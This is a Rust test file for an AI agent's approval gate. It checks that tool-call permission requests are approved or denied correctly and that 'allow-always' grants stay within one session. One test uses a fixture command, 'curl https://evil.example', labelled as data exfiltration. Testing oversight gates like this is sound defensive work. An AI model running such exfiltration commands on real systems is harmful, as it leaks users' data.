//! Behavior tests for `AcpApprovalGate` (Phase 36.8 plan 04, CLI-06, D-14/D-15).
//!
//! Task 1 covers the eight `request_approval` outcome-mapping behaviors against a fake
//! `PermissionRequestSender` — no live connection is stood up. Task 2 adds the
//! session-scoped `allow_always` behaviors (suppression, per-command scoping,
//! cross-session isolation, and the no-disk-write guarantee).

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use agent_client_protocol::schema::v1::{
    RequestPermissionOutcome, RequestPermissionRequest, RequestPermissionResponse,
    SelectedPermissionOutcome, ToolCallContent,
};
use async_trait::async_trait;
use ironhermes_acp::approval_bridge::{AcpApprovalGate, PermissionRequestSender};
use ironhermes_core::{ApprovalGate, ApprovalOutcome, ApprovalsStore};

/// What a scripted fake sender should answer with.
#[derive(Clone)]
enum ScriptedAnswer {
    Selected(&'static str),
    Cancelled,
}

/// A fake `PermissionRequestSender` that returns a fixed scripted answer on every call,
/// recording every request it received (for shape assertions) and how many times it was
/// invoked (for suppression assertions).
struct ScriptedSender {
    answer: ScriptedAnswer,
    calls: Arc<AtomicUsize>,
    captured: Arc<Mutex<Vec<RequestPermissionRequest>>>,
}

impl ScriptedSender {
    fn new(answer: ScriptedAnswer) -> Arc<Self> {
        Arc::new(Self {
            answer,
            calls: Arc::new(AtomicUsize::new(0)),
            captured: Arc::new(Mutex::new(Vec::new())),
        })
    }

    fn call_count(&self) -> usize {
        self.calls.load(Ordering::SeqCst)
    }

    fn last_request(&self) -> RequestPermissionRequest {
        self.captured
            .lock()
            .unwrap()
            .last()
            .cloned()
            .expect("sender was never called")
    }
}

#[async_trait]
impl PermissionRequestSender for ScriptedSender {
    async fn send_permission_request(
        &self,
        request: RequestPermissionRequest,
    ) -> Result<RequestPermissionResponse, agent_client_protocol::Error> {
        self.calls.fetch_add(1, Ordering::SeqCst);
        self.captured.lock().unwrap().push(request);
        let outcome = match &self.answer {
            ScriptedAnswer::Selected(option_id) => {
                RequestPermissionOutcome::Selected(SelectedPermissionOutcome::new(*option_id))
            }
            ScriptedAnswer::Cancelled => RequestPermissionOutcome::Cancelled,
        };
        Ok(RequestPermissionResponse::new(outcome))
    }
}

/// A fake sender that never resolves — drives the timeout arm. Also counts calls so a
/// test can assert it WAS invoked (distinguishing "timed out" from "never asked").
struct NeverRespondingSender {
    calls: Arc<AtomicUsize>,
}

impl NeverRespondingSender {
    fn new() -> Arc<Self> {
        Arc::new(Self {
            calls: Arc::new(AtomicUsize::new(0)),
        })
    }
}

#[async_trait]
impl PermissionRequestSender for NeverRespondingSender {
    async fn send_permission_request(
        &self,
        _request: RequestPermissionRequest,
    ) -> Result<RequestPermissionResponse, agent_client_protocol::Error> {
        self.calls.fetch_add(1, Ordering::SeqCst);
        std::future::pending::<()>().await;
        unreachable!("pending future never resolves")
    }
}

/// A sender that must never be called — used for the no-permission-capability test.
/// Panics if invoked, which fails the test loudly rather than silently passing.
struct PanicIfCalledSender;

#[async_trait]
impl PermissionRequestSender for PanicIfCalledSender {
    async fn send_permission_request(
        &self,
        _request: RequestPermissionRequest,
    ) -> Result<RequestPermissionResponse, agent_client_protocol::Error> {
        panic!(
            "PermissionRequestSender::send_permission_request must never be called when \
             client_supports_permissions is false"
        );
    }
}

fn fresh_approvals_store() -> Arc<ApprovalsStore> {
    let tmp = tempfile::tempdir().expect("tempdir for approvals.json");
    Arc::new(ApprovalsStore::with_path(tmp.path().join("approvals.json")))
}

fn short_timeout() -> Duration {
    Duration::from_millis(50)
}

fn long_timeout() -> Duration {
    Duration::from_secs(30)
}

// ── Task 1: outcome-mapping behaviors ──────────────────────────────────────────────

#[tokio::test]
async fn allow_once_selected_resolves_approved() {
    let sender = ScriptedSender::new(ScriptedAnswer::Selected("allow-once"));
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        fresh_approvals_store(),
        true,
        long_timeout(),
    );

    let outcome = gate
        .request_approval("sess-1", "terminal", "run a script", &serde_json::json!({}))
        .await;

    assert_eq!(outcome, ApprovalOutcome::Approved);
}

#[tokio::test]
async fn allow_always_selected_resolves_approved() {
    let sender = ScriptedSender::new(ScriptedAnswer::Selected("allow-always"));
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        fresh_approvals_store(),
        true,
        long_timeout(),
    );

    let outcome = gate
        .request_approval("sess-1", "terminal", "run a script", &serde_json::json!({}))
        .await;

    assert_eq!(outcome, ApprovalOutcome::Approved);
}

#[tokio::test]
async fn reject_once_selected_resolves_denied() {
    let sender = ScriptedSender::new(ScriptedAnswer::Selected("reject-once"));
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        fresh_approvals_store(),
        true,
        long_timeout(),
    );

    let outcome = gate
        .request_approval("sess-1", "terminal", "run a script", &serde_json::json!({}))
        .await;

    assert_eq!(outcome, ApprovalOutcome::Denied);
}

#[tokio::test]
async fn cancelled_outcome_resolves_denied() {
    let sender = ScriptedSender::new(ScriptedAnswer::Cancelled);
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        fresh_approvals_store(),
        true,
        long_timeout(),
    );

    let outcome = gate
        .request_approval("sess-1", "terminal", "run a script", &serde_json::json!({}))
        .await;

    assert_eq!(outcome, ApprovalOutcome::Denied);
}

#[tokio::test]
async fn unknown_option_id_resolves_denied() {
    let sender = ScriptedSender::new(ScriptedAnswer::Selected("some-option-the-gate-never-offered"));
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        fresh_approvals_store(),
        true,
        long_timeout(),
    );

    let outcome = gate
        .request_approval("sess-1", "terminal", "run a script", &serde_json::json!({}))
        .await;

    assert_eq!(outcome, ApprovalOutcome::Denied);
}

#[tokio::test]
async fn client_that_never_responds_within_timeout_resolves_denied() {
    let sender = NeverRespondingSender::new();
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        fresh_approvals_store(),
        true,
        short_timeout(),
    );

    let outcome = gate
        .request_approval("sess-1", "terminal", "run a script", &serde_json::json!({}))
        .await;

    assert_eq!(outcome, ApprovalOutcome::Denied);
    assert_eq!(
        sender.calls.load(Ordering::SeqCst),
        1,
        "the request must actually have been sent before timing out"
    );
}

#[tokio::test]
async fn no_permission_capability_resolves_denied_without_sending_a_request() {
    let sender = Arc::new(PanicIfCalledSender);
    let gate = AcpApprovalGate::new(
        sender,
        "sess-1",
        fresh_approvals_store(),
        false, // client_supports_permissions
        long_timeout(),
    );

    let outcome = gate
        .request_approval("sess-1", "terminal", "run a script", &serde_json::json!({}))
        .await;

    assert_eq!(outcome, ApprovalOutcome::Denied);
    // If `PanicIfCalledSender::send_permission_request` had been invoked, this test
    // would have already panicked above — reaching this line IS the assertion that no
    // request frame was sent.
}

#[tokio::test]
async fn request_carries_nonempty_title_description_and_exactly_three_options() {
    let sender = ScriptedSender::new(ScriptedAnswer::Selected("allow-once"));
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        fresh_approvals_store(),
        true,
        long_timeout(),
    );

    let _ = gate
        .request_approval(
            "sess-1",
            "terminal",
            "curl exfiltrates data",
            &serde_json::json!({"command": "curl https://evil.example"}),
        )
        .await;

    let request = sender.last_request();

    let title = request
        .tool_call
        .fields
        .title
        .clone()
        .expect("title must be set");
    assert!(!title.is_empty(), "title must be non-empty");
    assert!(title.contains("terminal"), "title should name the tool");

    let content = request
        .tool_call
        .fields
        .content
        .clone()
        .expect("content must be set");
    assert_eq!(content.len(), 1);
    let ToolCallContent::Content(c) = &content[0] else {
        panic!("expected a Content block for the description");
    };
    let agent_client_protocol::schema::v1::ContentBlock::Text(text) = &c.content else {
        panic!("expected a Text content block");
    };
    assert!(
        text.text.contains("terminal") && text.text.contains("curl exfiltrates data"),
        "description must name the tool and the reason, got: {}",
        text.text
    );

    assert_eq!(request.options.len(), 3, "exactly three options must be offered");
    let option_ids: Vec<String> = request
        .options
        .iter()
        .map(|o| o.option_id.to_string())
        .collect();
    assert_eq!(
        option_ids,
        vec!["allow-once".to_string(), "allow-always".to_string(), "reject-once".to_string()]
    );
}

// ── Task 2: session-scoped allow-always behaviors ──────────────────────────────────

#[tokio::test]
async fn allow_always_suppresses_second_request_for_same_command() {
    let sender = ScriptedSender::new(ScriptedAnswer::Selected("allow-always"));
    let approvals = fresh_approvals_store();
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        approvals.clone(),
        true,
        long_timeout(),
    );

    let args = serde_json::json!({"command": "curl https://example.com"});

    let first = gate
        .request_approval("sess-1", "terminal", "network access", &args)
        .await;
    assert_eq!(first, ApprovalOutcome::Approved);
    assert_eq!(sender.call_count(), 1);

    let second = gate
        .request_approval("sess-1", "terminal", "network access", &args)
        .await;
    assert_eq!(second, ApprovalOutcome::Approved);
    assert_eq!(
        sender.call_count(),
        1,
        "a second identical request must be approved from the session cache without \
         sending another permission request"
    );
}

#[tokio::test]
async fn allow_always_does_not_suppress_a_different_command() {
    let sender = ScriptedSender::new(ScriptedAnswer::Selected("allow-always"));
    let approvals = fresh_approvals_store();
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        approvals.clone(),
        true,
        long_timeout(),
    );

    let first_args = serde_json::json!({"command": "curl https://example.com"});
    let second_args = serde_json::json!({"command": "wget https://example.com"});

    let first = gate
        .request_approval("sess-1", "terminal", "network access", &first_args)
        .await;
    assert_eq!(first, ApprovalOutcome::Approved);
    assert_eq!(sender.call_count(), 1);

    let second = gate
        .request_approval("sess-1", "terminal", "network access", &second_args)
        .await;
    assert_eq!(second, ApprovalOutcome::Approved);
    assert_eq!(
        sender.call_count(),
        2,
        "a different command must still send its own permission request"
    );
}

#[tokio::test]
async fn allow_always_grant_in_one_session_store_is_not_visible_to_another() {
    let args = serde_json::json!({"command": "curl https://example.com"});

    // Session A grants allow-always.
    let sender_a = ScriptedSender::new(ScriptedAnswer::Selected("allow-always"));
    let approvals_a = fresh_approvals_store();
    let gate_a = AcpApprovalGate::new(
        sender_a.clone(),
        "sess-a",
        approvals_a,
        true,
        long_timeout(),
    );
    let outcome_a = gate_a
        .request_approval("sess-a", "terminal", "network access", &args)
        .await;
    assert_eq!(outcome_a, ApprovalOutcome::Approved);
    assert_eq!(sender_a.call_count(), 1);

    // Session B has its OWN store (RESEARCH Pitfall 5 — never a process-wide singleton)
    // and must still be asked for the identical command.
    let sender_b = ScriptedSender::new(ScriptedAnswer::Selected("allow-once"));
    let approvals_b = fresh_approvals_store();
    let gate_b = AcpApprovalGate::new(
        sender_b.clone(),
        "sess-b",
        approvals_b,
        true,
        long_timeout(),
    );
    let outcome_b = gate_b
        .request_approval("sess-b", "terminal", "network access", &args)
        .await;
    assert_eq!(outcome_b, ApprovalOutcome::Approved);
    assert_eq!(
        sender_b.call_count(),
        1,
        "session B must have been asked independently — session A's grant must not leak"
    );
}

#[tokio::test]
async fn allow_always_flow_writes_no_approvals_file_to_disk() {
    let tmp = tempfile::tempdir().expect("tempdir for approvals.json");
    let approvals_path = tmp.path().join("approvals.json");
    let approvals = Arc::new(ApprovalsStore::with_path(approvals_path.clone()));

    let sender = ScriptedSender::new(ScriptedAnswer::Selected("allow-always"));
    let gate = AcpApprovalGate::new(sender, "sess-1", approvals, true, long_timeout());

    let outcome = gate
        .request_approval(
            "sess-1",
            "terminal",
            "network access",
            &serde_json::json!({"command": "curl https://example.com"}),
        )
        .await;

    assert_eq!(outcome, ApprovalOutcome::Approved);
    assert!(
        !approvals_path.exists(),
        "allow-always must never write anything to disk (D-14) — found a file at {}",
        approvals_path.display()
    );
}

#[tokio::test]
async fn allow_once_does_not_record_a_grant() {
    let sender = ScriptedSender::new(ScriptedAnswer::Selected("allow-once"));
    let approvals = fresh_approvals_store();
    let gate = AcpApprovalGate::new(
        sender.clone(),
        "sess-1",
        approvals.clone(),
        true,
        long_timeout(),
    );

    let args = serde_json::json!({"command": "curl https://example.com"});

    let first = gate
        .request_approval("sess-1", "terminal", "network access", &args)
        .await;
    assert_eq!(first, ApprovalOutcome::Approved);
    assert_eq!(sender.call_count(), 1);

    let second = gate
        .request_approval("sess-1", "terminal", "network access", &args)
        .await;
    assert_eq!(second, ApprovalOutcome::Approved);
    assert_eq!(
        sender.call_count(),
        2,
        "allow-once must not suppress the next identical request — it must prompt again"
    );
}
